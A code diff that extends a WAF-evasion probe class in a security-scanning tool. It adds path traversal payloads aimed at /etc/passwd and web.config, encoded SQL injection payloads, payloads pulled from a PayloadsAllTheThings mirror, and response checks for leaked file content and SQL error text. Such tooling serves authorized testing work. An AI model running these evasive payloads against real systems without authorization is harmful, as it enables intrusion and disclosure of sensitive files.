@@ -1,7 +1,8 @@
 import random
 import time
 
-from app.tools.utils import normalize_domain_for_memory
+from app.tools.utils import normalize_domain_for_memory, SENSITIVE_CONTENT_INDICATORS
+from app.tools.payloads import fetch_intruder_payloads
 
 class EvasionService:
     """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""
@@ -39,7 +40,19 @@ class EvasionService:
         return self.runner.run(command, timeout=timeout)
 
     def advanced_vuln_probe(self, url):
-        """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""
+        """Performs targeted, WAF-evasive probes for SQLi and Path Traversal.
+
+        Verifies against real response content (`SENSITIVE_CONTENT_INDICATORS`),
+        not HTTP status alone - a bare "200" or "500" proves nothing about
+        *what* came back (a WAF challenge page or a normal error page can
+        return either), so the original status-only check both missed real
+        findings and could false-positive on an unrelated 200. Traversal
+        payloads cover Linux targets (`/etc/passwd` - what most real-world
+        and training-lab traversal vulnerabilities, e.g. PortSwigger's
+        labs, actually test for) as well as the original Windows/IIS-style
+        `web.config`, since recon doesn't always confirm the target OS
+        before this runs.
+        """
         print(f"[*] [Argus-Core] Starting Advanced Evasion Probes for: {url}")
         results = []
         clean_target = normalize_domain_for_memory(url)
@@ -48,24 +61,55 @@ class EvasionService:
         # --max-time/--connect-timeout let curl itself enforce the bound
         # (more reliable than only relying on the outer process being
         # killed - see command_runner.py's own timeout handling).
-        traversal_payloads = ["web.config", "..%2f..%2fweb.config", "..%5c..%5cweb.config"]
+        traversal_payloads = [
+            "../../../../etc/passwd",
+            "..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "....//....//....//....//etc/passwd",
+            "web.config",
+            "..%2f..%2fweb.config",
+            "..%5c..%5cweb.config",
+        ]
+        # Diversify beyond this small static list with real payloads pulled
+        # from the local PayloadsAllTheThings mirror (deduplicated - a
+        # random sample can coincidentally repeat one already listed above).
+        traversal_payloads += [
+            p for p in fetch_intruder_payloads(self.runner, "path_traversal")
+            if p not in traversal_payloads
+        ]
         for p in traversal_payloads:
-            cmd = f"curl -s --max-time 15 --connect-timeout 5 -o /dev/null -w '%{{http_code}} %{{size_download}}' '{url}?item={p}'"
-            res = self.stealth_run(cmd)
-            if res.startswith('200'):
-                results.append(f"[!] Path Traversal Success: {p}")
-                self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", "Path Traversal Bypass!")
+            cmd = f"curl -s --max-time 15 --connect-timeout 5 '{url}?item={p}'"
+            body = self.stealth_run(cmd)
+            for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
+                if indicator in body:
+                    results.append(f"[!] Path Traversal Success ({p}): {summary}")
+                    self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
+                    break
 
         # 2. SQLi WAF Evasion
+        # A 500 alone is still checked (a real signal on its own), but now
+        # also checks the body for actual SQL-error text - some targets
+        # return 200 with a visible DB error instead of a 500.
+        sqli_error_signatures = (
+            "sql syntax", "mysql_fetch", "unclosed quotation mark",
+            "odbc drivers error", "sqlite3.operationalerror", "pg_query",
+        )
         sqli_payloads = ["%u0027", "1'/**/OR/**/1=1/**/--", "1%20OR%201=1"]
+        sqli_payloads += [
+            p for p in fetch_intruder_payloads(self.runner, "sqli")
+            if p not in sqli_payloads
+        ]
         for p in sqli_payloads:
-            cmd = f"curl -s --max-time 15 --connect-timeout 5 -o /dev/null -w '%{{http_code}}' '{url}?id={p}'"
+            cmd = f"curl -s --max-time 15 --connect-timeout 5 -w '\\n%{{http_code}}' '{url}?id={p}'"
             res = self.stealth_run(cmd)
-            if res == "500":
+            body, _, code = res.rpartition("\n")
+            if code == "500":
                 results.append(f"[!] Potential SQLi (Evasion): {p} (Server Error 500)")
+                self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"SQLi: {p}", "SQLi potential via WAF evasion")
+            elif any(sig in body.lower() for sig in sqli_error_signatures):
+                results.append(f"[!] Potential SQLi (Evasion): {p} (SQL error signature in response body)")
                 self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"SQLi: {p}", "SQLi potential via WAF evasion")
 
         if not results:
             return "No vulnerabilities detected with advanced evasion probes."
-        
+
         return "--- [SHIELD] ADVANCED EVASION PROBE REPORT ---\n" + "\n".join(results)
